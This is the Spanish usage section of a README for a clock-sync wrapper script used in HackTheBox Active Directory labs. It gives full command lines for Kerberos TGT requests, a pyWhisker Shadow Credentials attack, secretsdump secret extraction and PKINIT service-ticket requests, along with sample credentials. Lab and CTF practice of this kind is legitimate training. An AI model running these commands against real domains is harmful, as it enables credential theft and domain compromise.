---

### 🔹 Mostrar solo la hora virtual (sin output extra)
```bash
./faketime_sync.sh 10.129.35.21 logging.htb --show-time
```
Devuelve únicamente la hora, útil para scripts externos:
```bash
DC_TIME=$(./faketime_sync.sh 10.129.35.21 logging.htb --show-time)
faketime "$DC_TIME" kinit user@LOGGING.HTB
```

---

### 🔹 Obtener TGT automáticamente
```bash
./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Pass123' --tgt
```
Obtiene un **Ticket Granting Ticket (TGT)** con la hora sincronizada.
Equivale a:
```bash
faketime '2026-04-22 07:51:51' kinit svc_recovery@LOGGING.HTB
```

---

### 🔹 Shadow Credentials attack
```bash
./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Pass123' --shadow 'msa_health$'
```
Ejecuta **pyWhisker** con la hora virtual para agregar shadow credentials
al target especificado. Requiere pyWhisker en `~/`.

---

### 🔹 Ejecutar comando personalizado
```bash
./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Pass123' --exec 'klist'
```
Ejecuta cualquier comando bajo `faketime` con la hora del DC.

**Más ejemplos con --exec:**
```bash
# Ver tickets activos
--exec 'klist'

# Volcar secretos con secretsdump
--exec 'python3 /opt/impacket/examples/secretsdump.py \
    -k -no-pass dc01.logging.htb'

# Ejecutar pyWhisker manualmente
--exec 'python3 ~/pywhisker/pywhisker.py -d logging.htb \
    -u svc_recovery -p Pass123 --target msa_health$ \
    --action list --dc-ip 10.129.35.21'

# getST con PKINIT
--exec 'python3 /opt/impacket/examples/getST.py \
    -spn cifs/dc01.logging.htb \
    -pfx-base64 $(cat cert.pfx.b64) \
    logging.htb/msa_health$'
```

---

## 🗂️ Resumen de opciones

| Opción | Args extra | Requiere creds | Descripción |
|--------|-----------|----------------|-------------|
| *(sin opción)* | — | No | Obtiene hora y muestra uso manual |
| `--show-time` | — | No | Imprime solo la hora virtual |
| `--tgt` | — | ✅ Sí | Solicita TGT con kinit |
| `--shadow <target>` | `<target>` | ✅ Sí | Shadow Credentials via pyWhisker |
| `--exec '<cmd>'` | `'<comando>'` | Opcional | Ejecuta cmd con faketime |

---

## 🔍 Métodos de detección de hora

El script prueba en orden hasta obtener la hora del DC:

| Prioridad | Método | Herramienta |
|-----------|--------|-------------|
| 1° | SMB timestamp | `nmap --script smb2-time` |
| 2° | NTP offset | `ntpdate -q` |
| 3° | LDAP currentTime | `ldapsearch` (requiere creds) |
| 4° | Fallback | `+7h` hardcodeado |

---

## 💡 Uso avanzado

```bash
# Exportar hora para usar en otros scripts
DC_TIME=$(./faketime_sync.sh 10.129.35.21 logging.htb --show-time)

# Encadenar con impacket
faketime "$DC_TIME" python3 getST.py ...

# Usar config Kerberos generada
KRB5_CONFIG=/tmp/krb5_faketime.conf faketime "$DC_TIME" klist
```

---

## ⚠️ Nota

> Diseñado para entornos de laboratorio y CTFs (HackTheBox, TryHackMe).  
> No uses este script contra sistemas sin autorización explícita.
